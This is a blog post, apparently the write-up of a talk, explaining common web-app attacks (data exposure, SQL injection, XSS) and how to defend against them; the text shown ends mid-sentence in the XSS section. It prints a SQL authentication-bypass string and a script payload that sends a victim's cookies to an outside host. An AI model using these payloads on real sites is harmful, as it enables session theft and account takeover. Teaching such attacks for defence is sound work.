<!doctype html><html lang=en><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>How to Secure Your Web Apps (At Least a Little Bit) | Denis Rechkunov | rdner's blog</title>
<meta name=description content="This is a write up of my recent (if can call October 2018 recent) talk that I gave for my colleagues. It's about typical attack vectors used against web-apps and how to decrease the attack surface of the apps."><meta name=author content="Denis Rechkunov"><meta name=copyright content="Denis Rechkunov"><meta property="og:url" content="https://rdner.de/posts/tech/security/secure-web-apps/"><meta property="og:site_name" content="rdner's blog"><meta property="og:title" content="How to Secure Your Web Apps (At Least a Little Bit) | Denis Rechkunov"><meta property="og:description" content="This is a write up of my recent (if can call October 2018 recent) talk that I gave for my colleagues. It's about typical attack vectors used against web-apps and how to decrease the attack surface of the apps."><meta property="og:locale" content="en_US"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-03-10T10:05:39+01:00"><meta property="article:modified_time" content="2019-03-10T10:05:39+01:00"><meta property="article:tag" content="web"><meta property="article:tag" content="sql"><meta property="article:tag" content="xss"><meta property="article:tag" content="csrf"><meta property="article:tag" content="csp"><meta property="article:tag" content="cors"><meta property="og:image" content="https://rdner.de/posts/tech/security/secure-web-apps/cover.jpg"><meta property="og:image:secure_url" content="https://rdner.de/posts/tech/security/secure-web-apps/cover.jpg"><meta property="og:image:type" content="image/jpeg"><meta property="og:image" content="https://rdner.de/posts/tech/security/secure-web-apps/cover.jpg"><meta property="og:image:secure_url" content="https://rdner.de/posts/tech/security/secure-web-apps/cover.jpg"><meta property="og:image:type" content="image/jpeg"><meta name=theme-color content="#5a2673"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-title content="rdner's blog"><meta name=mobile-web-app-capable content="yes"><meta name=application-name content="rdner's blog"><meta name=msapplication-TileColor content="#5a2673"><meta name=license content="http://creativecommons.org/licenses/by-nc-sa/4.0/"><meta name=theme content="Loud Pragmatic"><link rel=canonical href=https://rdner.de/posts/tech/security/secure-web-apps/><style>:root{--main-color:#5a2673;--bg-color:#141116;--highlight-color:#8952A2;--border-color:#D7DADC;--card-bg-color:#252426;--card-overlay-color:rgba(20,17,22,0.6);--text-color:#D7DADC;--secondary-text-color:#C0C0C0;--highlight-text-color:#FFF}</style><link rel=stylesheet href=/css/styles.css type=text/css><link rel=icon href=/favicon.ico sizes=48x48><link rel=icon href=/favicon.svg sizes=any type=image/svg+xml><link rel=apple-touch-icon href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5a2673><link rel=manifest href=/site.webmanifest><link rel=license href=http://creativecommons.org/licenses/by-nc-sa/4.0/><meta name=fediverse:creator content="@rdner@mastodon.social"><script defer data-domain=rdner.de src=https://plausible.io/js/script.js></script></head><body><header class=site-header><nav class="site-nav undecorated"><ul class=no-bullets><li><a href=/><img class=logo alt="website logo" src=/images/logo.svg></a></li><li class=flex-expanded></li><li><a href=/posts/ title="Blog Posts">Posts</a></li><li><a href=/music/ title="Music Releases">Music</a></li><li><a href=/talks/ title="My Talks">Talks</a></li><li><a href=/cv.html title="My Most Recent CV">CV</a></li><li><a href=https://www.linkedin.com/in/rdner title="My LinkedIn Profile" rel="nofollow noreferrer" target=_blank><img src=/images/menu/linkedin.svg alt=LinkedIn></a></li><li><a href=https://github.com/rdner title="My Github Profile" rel="nofollow noreferrer" target=_blank><img src=/images/menu/github.svg alt=Github></a></li><li><a href=https://mastodon.social/@rdner title="My Mastodon Profile" rel="nofollow noreferrer me" target=_blank><img src=/images/menu/mastodon.svg alt=Mastodon></a></li></ul></nav></header><main><div class=container><div class="breadcrumbs undecorated"><span class=breadcrumb><a href=/>Home</a>
</span><span class=breadcrumb><a href=/posts/>Blog Posts</a>
</span><span class=breadcrumb><a href=/posts/tech/>Technology</a>
</span><span class=breadcrumb><a href=/posts/tech/security/>Information Security</a>
</span><span class=breadcrumb>How to Secure Your Web Apps (At Least a Little Bit)</span></div><article class=post><header class="post-header with-cover" style=background-image:url(/posts/tech/security/secure-web-apps/cover.jpg)><h1 class="shadowed unbordered centered">How to Secure Your Web Apps (At Least a Little Bit)</h1><div class=post-summary-card><div class=info><img class=author-picture alt="author picture" src=/images/rdner.jpg><div><div class=author-name>Author:&nbsp;
<a href=mailto:denis@rdner.de>Denis Rechkunov</a></div><div class=facts><time datetime="2019-03-10 10:05:39 +0100 +0100">Mar 10, 2019</time>
&nbsp;/&nbsp;
~4900&nbsp;words
&nbsp;/&nbsp;23&nbsp;min&nbsp;read</div></div></div><p>This is a write up of my recent (if can call October 2018 recent) talk that I gave for my colleagues. It's about typical attack vectors used against web-apps and how to decrease the attack surface of the apps.</p><div>Image credit: <a href=https://github.com/dmahlow rel="nofollow noreferrer" target=_blank>github.com</a></div></div></header><div class=content><aside class="toc undecorated"><nav id=TableOfContents><ul><li><a href=#disclaimer>Disclaimer</a></li><li><a href=#definitions>Definitions</a></li><li><a href=#attack-surface>Attack surface</a><ul><li><a href=#receiving-and-processing-data>Receiving and processing data</a></li><li><a href=#browsers>Browsers</a></li><li><a href=#web-standards-and-apis>Web-standards and APIs</a></li></ul></li><li><a href=#attack-vectors>Attack vectors</a><ul><li><a href=#sensitive-data-exposure>Sensitive data exposure</a><ul><li><a href=#how-to-attack>How to attack</a></li><li><a href=#consequences>Consequences</a></li><li><a href=#how-to-protect>How to protect</a></li></ul></li><li><a href=#sql-injection>SQL injection</a><ul><li><a href=#how-to-attack-1>How to attack</a></li><li><a href=#consequences-1>Consequences</a></li><li><a href=#how-to-protect-1>How to protect</a></li></ul></li><li><a href=#cross-site-scripting-xss>Cross-site scripting (XSS)</a><ul><li><a href=#how-to-attack-2>How to attack</a></li><li><a href=#consequences-2>Consequences</a></li><li><a href=#how-to-protect-2>How to protect</a></li></ul></li><li><a href=#anchor-abuse>Anchor abuse</a><ul><li><a href=#how-to-attack-3>How to attack</a></li><li><a href=#consequences-3>Consequences</a></li><li><a href=#how-to-protect-3>How to protect</a></li></ul></li><li><a href=#cross-site-request-forgery-csrf>Cross Site Request Forgery (CSRF)</a><ul><li><a href=#how-to-attack-4>How to attack</a></li><li><a href=#consequences-4>Consequences</a></li><li><a href=#how-to-protect-4>How to protect</a></li></ul></li><li><a href=#iframe-related-vectors>iframe-related vectors</a><ul><li><a href=#how-to-attack-5>How to attack</a></li><li><a href=#consequences-5>Consequences</a></li><li><a href=#how-to-protect-5>How to protect</a></li></ul></li><li><a href=#unrestricted-file-upload>Unrestricted file upload</a><ul><li><a href=#how-to-attack-6>How to attack</a></li><li><a href=#consequences-6>Consequences</a></li><li><a href=#how-to-protect-6>How to protect</a></li></ul></li></ul></li><li><a href=#preventive-measures>Preventive measures</a><ul><li><a href=#cross-origin-resource-sharing-cors>Cross-Origin Resource Sharing (CORS)</a></li><li><a href=#content-security-policy-csp>Content Security Policy (CSP)</a></li></ul></li><li><a href=#before-you-go>Before you go</a></li><li><a href=#links>Links</a></li></ul></nav></aside><h2 id=disclaimer>Disclaimer&nbsp;<a class="undecorated heading-anchor" href=#disclaimer>#</a></h2><p>I&rsquo;m not a security expert, please check every word I write.</p><p>Although, I have some experience in basic pen-testing and I have exposed some vulnerabilities in the past, I don&rsquo;t consider myself an expert in this area. There are people out there whose full-time job is information security and I&rsquo;m not going to pretend I&rsquo;m one of them. I just do some
<a href=https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security rel="nofollow noreferrer" target=_blank>CTFs</a>
as a hobby and build software as my daily job, so it gives me enough knowledge to write such articles and give such talks but does not make me an expert.</p><h2 id=definitions>Definitions&nbsp;<a class="undecorated heading-anchor" href=#definitions>#</a></h2><p>I figured the best way to start is to make sure we&rsquo;re all aligned on some important definitions in this area such as:</p><ul><li><a href=https://en.wikipedia.org/wiki/User-generated_content rel="nofollow noreferrer" target=_blank>UGC</a>
— User-Generated Content. Basically, everything displayed in your system created by users. e.g. Tweets, Facebook posts, Medium articles, etc.</li><li><a href=https://en.wikipedia.org/wiki/Hacker rel="nofollow noreferrer" target=_blank>Hacker</a>
— thanks to media and movie makers that&rsquo;s the most confusing one for people. Simply speaking, it&rsquo;s a person who can quickly figure out how things work. Being a hacker does not immediately mean being a criminal and it&rsquo;s important to understand.</li><li><a href=https://en.wikipedia.org/wiki/Black_hat rel="nofollow noreferrer" target=_blank>Black hat</a>
— well, if you still can&rsquo;t resist to blame hackers for all the hacked accounts and exposed data, you&rsquo;ll be after these people. Hackers who are driven by illegal intentions and/or hack for their own profit are called black hats in the infosec community.</li><li><a href=https://en.wikipedia.org/wiki/White_hat_%28computer_security%29 rel="nofollow noreferrer" target=_blank>White hat</a>
— and white hats are &ldquo;good folks&rdquo; because they&rsquo;re researches and they report their findings, so black hat hackers can&rsquo;t use these vulnerabilities.</li><li><a href=https://en.wikipedia.org/wiki/Vector_%28malware%29 rel="nofollow noreferrer" target=_blank>Attack vector</a>
— a method/way how something (e.g. software, hardware, people) can be possibly exploited by an attacker. For example, you might have heard of SQL injections, XSS, CSRF, buffer overflow, etc. This article will cover some of those.</li><li><a href=https://en.wikipedia.org/wiki/Attack_surface rel="nofollow noreferrer" target=_blank>Attack surface</a>
— the definition says it&rsquo;s &ldquo;the sum of the different points (the &ldquo;attack vectors&rdquo;)&rdquo; but I&rsquo;d say it&rsquo;s any part of your system that&rsquo;s exposed to the world. In the context of web apps, it&rsquo;s all the endpoints and open ports your web-app/server has which are available from the internet.</li></ul><p>Now, we&rsquo;re done with the definitions, let&rsquo;s talk about Web.</p><h2 id=attack-surface>Attack surface&nbsp;<a class="undecorated heading-anchor" href=#attack-surface>#</a></h2><p>I think web-apps have one of the largest attack surfaces. And it&rsquo;s in their nature, just think about it: your browser is a program that downloads other programs from the internet and executes them trying to keep these programs in the browser sandbox. Sounds scary, right? At least it does for me.</p><p>So, what makes the attack surface of web-apps so large?</p><h3 id=receiving-and-processing-data>Receiving and processing data&nbsp;<a class="undecorated heading-anchor" href=#receiving-and-processing-data>#</a></h3><p>Unless it’s a static web-site, web-apps are meant to interact with users and that means they receive and process data from the users. And the history shows us it&rsquo;s very hard to make it secure because you need to sanitize the data properly before you actually process it.</p><h3 id=browsers>Browsers&nbsp;<a class="undecorated heading-anchor" href=#browsers>#</a></h3><p>Nowadays web-apps are mostly running in a browser (JavaScript). Sure, there are mobile apps that just use APIs but some of them still use web-views which are eventually browsers. The problem with that is you don&rsquo;t control that environment as a developer. The server is the only environment which is under your control in this case. For example, there are tons of malicious browser extensions out there which can steal your user&rsquo;s data and then sell it on the dark web but in the end it hurts your company when the database of your users is on sale.</p><h3 id=web-standards-and-apis>Web-standards and APIs&nbsp;<a class="undecorated heading-anchor" href=#web-standards-and-apis>#</a></h3><p>Web-standards (which are many) are not under your control when your build an app but, in fact, they’re a huge part of your app. That&rsquo;s the point not many people think about. What if someone finds a vulnerability in something so fundemential as a web-standard? Your app will be automatically exposed for attacks then, and usually there is nothing you can do about it until the standard is fixed.</p><p>For example, in 2016
<a href=https://twitter.com/mathias rel="nofollow noreferrer" target=_blank>Mathias Bynens</a>
discovered that
<a href=https://mathiasbynens.github.io/rel-noopener/ rel="nofollow noreferrer" target=_blank>any link that opens a new tab of you browser actually lets the new tab to make changes in your previous one</a>
.</p><p>And what&rsquo;s the big deal you might ask? Well, let&rsquo;s imagine you do the following:</p><ul><li>You see a Facebook post with an interesting link</li><li>You open the link, read the content</li><li>You go back to the Facebook tab and you see the Facebook login page</li></ul><p>What would you do?</p><p>Most of the users would think &ldquo;well, happens sometimes, I get logged out all the time&rdquo; and they would try to login again. And the same moment you would send your password to an attacker. Why? Because that was not the Facebook page, sure it looked like it was but it&rsquo;s simpler than you think to do so. Did you actually check the URL? How often do you check the website URL?</p><p>This is why such things is a very big deal because most people are not paranoid and they trust things they see. And, by the way, it actually worked on Facebook for some time, I checked it myself.</p><h2 id=attack-vectors>Attack vectors&nbsp;<a class="undecorated heading-anchor" href=#attack-vectors>#</a></h2><p>Let&rsquo;s talk business, how do people actually attack web-apps?</p><p>I&rsquo;m pretty sure that if you worked on web-apps in your lifetime you most likely have heard of most of the attack vectors I listed next. But just theory would not be fun right? You can read the theoretical part in tons of other articles on the internet, so I prepared a
<a href=https://github.com/rdner/security-nightmare rel="nofollow noreferrer" target=_blank>demo web-app</a>
that you&rsquo;re free to run on your computer and follow demo examples there.</p><h3 id=sensitive-data-exposure>Sensitive data exposure&nbsp;<a class="undecorated heading-anchor" href=#sensitive-data-exposure>#</a></h3><h4 id=how-to-attack>How to attack&nbsp;<a class="undecorated heading-anchor" href=#how-to-attack>#</a></h4><p>I know, sounds very generic and obvious but you&rsquo;d be surprised to know what people do in real world. Some very confidential data can be served as a part of the API response or can be put in logs.</p><p>For example, security researcher
<a href=https://www.vincent-haupert.de/ rel="nofollow noreferrer" target=_blank>Vincent Haupert</a>
gave a talk &ldquo;
<a href=https://media.ccc.de/v/33c3-7969-shut_up_and_take_my_money rel="nofollow noreferrer" target=_blank>Shut up and take my money</a>
&rdquo; at
<a href=https://media.ccc.de/c/33c3 rel="nofollow noreferrer" target=_blank>33c3</a>
in 2016. The talk was about a German bank
<a href=https://n26.com/en-eu/ rel="nofollow noreferrer" target=_blank>N26</a>
. He hacked their mobile app, so he was able to steal money and eventually the whole account of another person. One of the reasons he could do that was some sensitive data served from their API.</p><p>Another example, which for some reason didn&rsquo;t receive so much attention, is
<a href="https://www.reuters.com/article/us-twitter-passwords/twitter-says-glitch-exposed-substantial-number-of-users-passwords-idUSKBN1I42JG?il=0" rel="nofollow noreferrer" target=_blank>Twitter</a>
and
<a href=https://gizmodo.com/github-tells-some-users-it-accidentally-stored-their-pa-1825702783 rel="nofollow noreferrer" target=_blank>Github</a>
were adding user passwords to their logs every time users logged in. That means, every engineer (likely not just engineers) could access your password for a long time until May 2018. I suspect they started working on GDPR compliance and found this issue in the process. Who can make sure that there is no one at Twitter and Github who could collect these passwords and sell them on the dark web?</p><h4 id=consequences>Consequences&nbsp;<a class="undecorated heading-anchor" href=#consequences>#</a></h4><p>In general, if you expose any sensitive data in your apps or APIs it enables attackers to impersonate users, steal their accounts and, what can be much worse, their identity.</p><h4 id=how-to-protect>How to protect&nbsp;<a class="undecorated heading-anchor" href=#how-to-protect>#</a></h4><ul><li><strong>NEVER</strong> log any sensitive data, you can&rsquo;t just log every single request body using the same function, every single endpoint should be analyzed individually.</li><li><strong>NEVER</strong> propagate software errors / exception to the user. It most likely won&rsquo;t help the user to understand the error anyway but for an attacker it&rsquo;s always a huge help. I saw web-sites that in case of error showed me all database connection details including credentials. Some errors can indicate that certain attack vectors work for your web-site, like SQL injections.</li><li><strong>NEVER</strong> include any information to the response which is not supposed to be displayed on the UI. It&rsquo;s very important, if you feel like you can&rsquo;t show it to the user you should not serve it from your app at all.</li></ul><p>I already hear some questions like: &ldquo;But how am I suppose to debug a bug that user found then?&rdquo;.</p><p>Well, if you&rsquo;re really struggling with reproducing reported bugs or you can&rsquo;t find any information in your tracing system probably you should implement encrypted error bodies.</p><p>Once I got a 500 error from Google and guess what: I got a generic error message like &ldquo;Internal server error&rdquo; and something like &ldquo;Please contact our support providing this text below&rdquo;. And the text below was just an encrypted text. I assume they encrypt every error exposed outside and then they have an internal tool to decrypt the message and view stack traces, error details, etc. It&rsquo;s actually fairly easy to implement, just don&rsquo;t be lazy.</p><h3 id=sql-injection>SQL injection&nbsp;<a class="undecorated heading-anchor" href=#sql-injection>#</a></h3><p>This one can be called a classic attack vector for web-apps. I used this to attack web-sites since I was 14 yo and surprisingly even today you can find some web-apps that are vulnerable despite the fact that there are tons of SQL libraries that handle this type of things for you.</p><h4 id=how-to-attack-1>How to attack&nbsp;<a class="undecorated heading-anchor" href=#how-to-attack-1>#</a></h4><p>As the name suggests you inject some additional statements/parameters to the existing SQL query on the server because this server does not sanitize your input very well.</p><p>There can be many ways to do so, but mostly you can find it with web-site input fields or URL query parameters.</p><p>If there is some kind of string input on the website that performs a SQL query you can assume that the query would look something like (e.g. for authentication):</p><div class=highlight><pre tabindex=0 style=color:#c9c9c9;background-color:#282c34;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#7fbaf5>SELECT</span> user_id
</span></span><span style=display:flex><span><span style=color:#7fbaf5>FROM</span> users
</span></span><span style=display:flex><span><span style=color:#7fbaf5>WHERE</span> username <span style=color:#bc74c4>=</span> <span style=color:#82cc6a>&#39;root&#39;</span> <span style=color:#7fbaf5>AND</span> password <span style=color:#bc74c4>=</span> <span style=color:#82cc6a>&#39;9c42a1346e333a770904b2a2b37fa7d3&#39;</span>
</span></span></code></pre></div><p>But it&rsquo;s a prepared statement, what about how the app actually builds it? And here developers can have some trouble if they decided to implement it themselves.</p><p>Have a look at the following example:</p><div class=highlight><pre tabindex=0 style=color:#c9c9c9;background-color:#282c34;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-go data-lang=go><span style=display:flex><span>fmt<span style=color:#56b6c2>.</span><span style=color:#57c7ff>Printf</span><span style=color:#56b6c2>(</span>
</span></span><span style=display:flex><span>  <span style=color:#82cc6a>&#34;SELECT user_id FROM users WHERE username = &#39;%s&#39; AND password = &#39;%s&#39;&#34;</span><span style=color:#56b6c2>,</span>
</span></span><span style=display:flex><span>  username<span style=color:#56b6c2>,</span> <span style=color:#57c7ff>md5</span><span style=color:#56b6c2>(</span>password<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span><span style=color:#56b6c2>)</span>
</span></span></code></pre></div><p>This is a huge red flag here. Why? What happens when we input a username <code>root' OR 1=1-- </code>?</p><p>We will have this SQL query built:</p><div class=highlight><pre tabindex=0 style=color:#c9c9c9;background-color:#282c34;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#7fbaf5>SELECT</span> user_id
</span></span><span style=display:flex><span><span style=color:#7fbaf5>FROM</span> users
</span></span><span style=display:flex><span><span style=color:#7fbaf5>WHERE</span> username <span style=color:#bc74c4>=</span> <span style=color:#82cc6a>&#39;root&#39;</span> <span style=color:#7fbaf5>OR</span> <span style=color:#56b6c2>1</span><span style=color:#bc74c4>=</span><span style=color:#56b6c2>1</span><span style=color:#3e4460>-- &#39; AND password = &#39;9c42a1346e333a770904b2a2b37fa7d3&#39;
</span></span></span></code></pre></div><p>What happened here is we injected a new condition to the <code>WHERE</code> statement which basically says &ldquo;select a user with a name &lsquo;root&rsquo; or where 1=1&rdquo; but the thing is — in our universe <code>1</code> always equals <code>1</code> and that query would select all users from the database. The <code>-- </code>part in the end is just to say &ldquo;everything else is a SQL comment, so just ignore it&rdquo;. What happens next entirely depends on the server implementation really, but people usually take the first row from the query result and call it a successful authentication and you&rsquo;re in as an attacker. If you want to impersonate a particular user that you know 100% exists, like <code>root</code> or <code>admin</code> for example, you just swap <code>OR</code> with <code>AND</code> in this case, so the query says &ldquo;select a user with a name &lsquo;root&rsquo; and where 1=1&rdquo;. This query actually returns a row, so it&rsquo;s even more likely that the server would not fail and would process the result correctly.</p><p>There are many types of SQL injections which I&rsquo;m not going to cover in this article (deserves a full dedicated article maybe?) but just so you know, an attacker can also update, delete or even extract your entire database via such SQL injection. And it&rsquo;s not just about string parameters, number parameters are even worse.</p><p>There is a very cool tool called
<a href=http://sqlmap.org/ rel="nofollow noreferrer" target=_blank>sqlmap</a>
that pen-testers use for such occasions, so highly recommended to learn how to use it and try to scan your web-app maybe. I remember writing complex scripts for the things this tool does and was very happy to learn that such tool exists.</p><p>Also, there is an OWASP page
<a href=https://www.owasp.org/index.php/SQL_Injection rel="nofollow noreferrer" target=_blank>here</a>
. OWASP is a non-for-profit security-focused organization that collects a wikipedia-like database describing attack vectors and vulnerabilities.</p><h4 id=consequences-1>Consequences&nbsp;<a class="undecorated heading-anchor" href=#consequences-1>#</a></h4><p>The attacker is able to:</p><ul><li>Bypass authentication</li><li>Alter or destroy your database (hope you have backups, right?)</li><li>Get access to your entire database and download it</li></ul><h4 id=how-to-protect-1>How to protect&nbsp;<a class="undecorated heading-anchor" href=#how-to-protect-1>#</a></h4><ul><li><strong>NEVER</strong> use string interpolation or concatenation, don&rsquo;t implement SQL builders yourself</li><li><strong>ALWAYS</strong> use a library that sanitizes query parameters properly</li></ul><h3 id=cross-site-scripting-xss>Cross-site scripting (XSS)&nbsp;<a class="undecorated heading-anchor" href=#cross-site-scripting-xss>#</a></h3><p>If SQL injection attack was against the server this is one is against the clients — browsers. I&rsquo;m pretty sure that everybody who&rsquo;s using the internet knows that browsers run JavaScript to make your user experience more interactive, so you don&rsquo;t have to request the whole page from the server every time you need to render a word. But everything comes with a cost and JavaScript is not an exception. The nature of the XSS attack vector is rendering of some malicious UGC that contains JavaScript code and the browser mistakenly evaluates this JavaScript which it should not.</p><p>This attack most likely would not affect your server much, but it can actually steal sessions of your users which can definitely affect your company and reputation particularly.</p><h4 id=how-to-attack-2>How to attack&nbsp;<a class="undecorated heading-anchor" href=#how-to-attack-2>#</a></h4><p>Again, there are many ways to execute this depending on your goals but if I were to steal active user sessions on a vulnerable web-site I&rsquo;d post the following on a public feed that users most likely to see:</p><div class=highlight><pre tabindex=0 style=color:#c9c9c9;background-color:#282c34;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>script</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#7fbaf5>var</span> e<span style=color:#bc74c4>=</span><span style=color:#7fbaf5>document</span><span style=color:#56b6c2>.</span>createElement<span style=color:#56b6c2>(</span><span style=color:#82cc6a>&#39;img&#39;</span><span style=color:#56b6c2>);</span>
</span></span><span style=display:flex><span>  e<span style=color:#56b6c2>.</span>src<span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#39;https://rdner.de/inbox?sess=&#39;</span><span style=color:#bc74c4>+</span><span style=color:#7fbaf5>encodeURIComponent</span><span style=color:#56b6c2>(</span><span style=color:#7fbaf5>document</span><span style=color:#56b6c2>.</span>cookie<span style=color:#56b6c2>);</span>
</span></span><span style=display:flex><span>  <span style=color:#7fbaf5>document</span><span style=color:#56b6c2>.</span>body<span style=color:#56b6c2>.</span>appendChild<span style=color:#56b6c2>(</span>e<span style=color:#56b6c2>);</span>
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;/</span><span style=color:#bc74c4>script</span><span style=color:#56b6c2>&gt;</span>
</span></span></code></pre></div><p>If the web-site does not escape the output properly this is what happens:</p><ul><li>The <code>&lt;script></code> tag tells the browser to start evaluating the expression inside the tag</li><li>Then the code creates a new <code>img</code> element, sets the source of the image as <code>'https://rdner.de/inbox?sess='+encodeURIComponent(document.cookie)</code> and the <code>encodeURIComponent(document.cookie)</code> part actually extracts all your cookies including your current web-site session identifier that can be used to impersonate you from another browser by the attacker (in this case me).</li><li>The <code>img</code> element is appended to the page which means the browser makes a request with the URL I set to fetch the image and display it. The browser does not care what URL you put there, it just tries to request the content. And yes, your
<a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS rel="nofollow noreferrer" target=_blank>CORS policy</a>
does not matter here at all.</li><li>I collected all the sessions I received via such requests and I can set these cookies in my browser and get access to your account, see any data there, post on your behalf and maybe convince your friends to send me some money.</li></ul><p>We can make it even better actually serving an image from <code>https://rdner.de/inbox</code> so the post does not look suspicious.</p><p>As mentioned, the goals can vary. Some people exploit XSS to perform a
<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack rel="nofollow noreferrer" target=_blank>DDoS</a>
(distributed denial-of-service) attack against another web-site other people mine crypto-currencies via XSS.</p><p>Other important things to mention</p><p>White-listing certain tags (like some early PHP libraries did) would not work, because you can actually run this attack via any tag using:</p><div class=highlight><pre tabindex=0 style=color:#c9c9c9;background-color:#282c34;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>totally-custom-tag</span> <span style=color:#bc74c4>onmouseover</span><span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#34;&lt;same code here&gt;&#34;</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>  Long interesting text
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;/</span><span style=color:#bc74c4>totally-custom-tag</span><span style=color:#56b6c2>&gt;</span>
</span></span></code></pre></div><p>If you serve user content as inline JSON like so:</p><div class=highlight><pre tabindex=0 style=color:#c9c9c9;background-color:#282c34;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#7fbaf5>&lt;!DOCTYPE HTML&gt;</span>
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>html</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>head</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>script</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>	  <span style=color:#7fbaf5>var</span> data <span style=color:#bc74c4>=</span> <span style=color:#56b6c2>{</span>
</span></span><span style=display:flex><span>		  post<span style=color:#bc74c4>:</span> <span style=color:#82cc6a>&#39;some UGC here&#39;</span>
</span></span><span style=display:flex><span>	  <span style=color:#56b6c2>};</span>
</span></span><span style=display:flex><span>	<span style=color:#56b6c2>&lt;/</span><span style=color:#bc74c4>script</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#56b6c2>&lt;/</span><span style=color:#bc74c4>head</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>body</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>   ...
</span></span><span style=display:flex><span>  <span style=color:#56b6c2>&lt;/</span><span style=color:#bc74c4>body</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;/</span><span style=color:#bc74c4>html</span><span style=color:#56b6c2>&gt;</span>
</span></span></code></pre></div><p>then it&rsquo;s broken because if I put:</p><div class=highlight><pre tabindex=0 style=color:#c9c9c9;background-color:#282c34;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#56b6c2>&lt;/</span><span style=color:#bc74c4>script</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;</span><span style=color:#bc74c4>script</span><span style=color:#56b6c2>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#7fbaf5>var</span> e<span style=color:#bc74c4>=</span><span style=color:#7fbaf5>document</span><span style=color:#56b6c2>.</span>createElement<span style=color:#56b6c2>(</span><span style=color:#82cc6a>&#39;img&#39;</span><span style=color:#56b6c2>);</span>
</span></span><span style=display:flex><span>  e<span style=color:#56b6c2>.</span>src<span style=color:#bc74c4>=</span><span style=color:#82cc6a>&#39;https://rdner.de/inbox?sess=&#39;</span><span style=color:#bc74c4>+</span><span style=color:#7fbaf5>encodeURIComponent</span><span style=color:#56b6c2>(</span><span style=color:#7fbaf5>document</span><span style=color:#56b6c2>.</span>cookie<span style=color:#56b6c2>);</span>
</span></span><span style=display:flex><span>  <span style=color:#7fbaf5>document</span><span style=color:#56b6c2>.</span>body<span style=color:#56b6c2>.</span>appendChild<span style=color:#56b6c2>(</span>e<span style=color:#56b6c2>);</span>
</span></span><span style=display:flex><span><span style=color:#56b6c2>&lt;/</span><span style=color:#bc74c4>script</span><span style=color:#56b6c2>&gt;</span>
</span></span></code></pre></div><p>in there it will be evaluated.</p><p>I see people being shocked when I tell them about it, but yes, this is how it works and there is a reason for that.</p><p>In the past there was a plan that browsers would support different programming languages not just JavaScript, Microsoft was planning on
<a href=https://en.wikipedia.org/wiki/VBScript#Environments rel="nofollow noreferrer" target=_blank>pushing VBScript</a>
, for example. As a result, browsers could not implement any syntax awareness for the code in <code>script</code> tags. The browser is just simply looking for a <code>&lt;/script></code> string to end the code evaluation even if it&rsquo;s a part of a JavaScript string. So, as you might have noticed our malicious string actually starts with a closing <code>script</code> tag and we immediately open a new one with our own code.</p><p>Some time ago, on the rise of
<a href=https://en.wikipedia.org/wiki/Isomorphic_JavaScript rel="nofollow noreferrer" target=_blank>isomorphic JavaScript</a>
frameworks it was the most often vulnerability that I was finding. Most of the isomorphic frameworks computed the page state on server and then included the computed state object into the page so the front-end part of the app does not have to re-compute the state again. So, even though the apps properly escaped the content before it was displayed, the apps were vulnerable because of that data insertion.</p><p>Another option to perform an XSS attack (although most of the modern browsers actually detect and prevent it) can be putting your code as a part of the URL (e.g. query string parameter) if you noticed that the web-site renders this part of the URL on the page with no escaping. Then just give this link to someone and the rest you know.</p><h4 id=consequences-2>Consequences&nbsp;<a class="undecorated heading-anchor" href=#consequences-2>#</a></h4><p>The attacker is able to:</p><ul><li>Get access to your user accounts (maybe you got lucky and none of them was an admin)</li><li>Execute any client-side code for your web-site visitors, causing traffic to other web-sites or malicious messages.</li></ul><h4 id=how-to-protect-2>How to protect&nbsp;<a class="undecorated heading-anchor" href=#how-to-protect-2>#</a></h4><p>Like it was with SQL injections, it&rsquo;s all about sanitizing user input but in this case you can choose when you actually do that: you can forbid users from inputting certain characters (which is in my opinion a bad user experience) or you can escape the data when you actually render it on the web-site using
<a href=https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references rel="nofollow noreferrer" target=_blank>HTML entities</a>
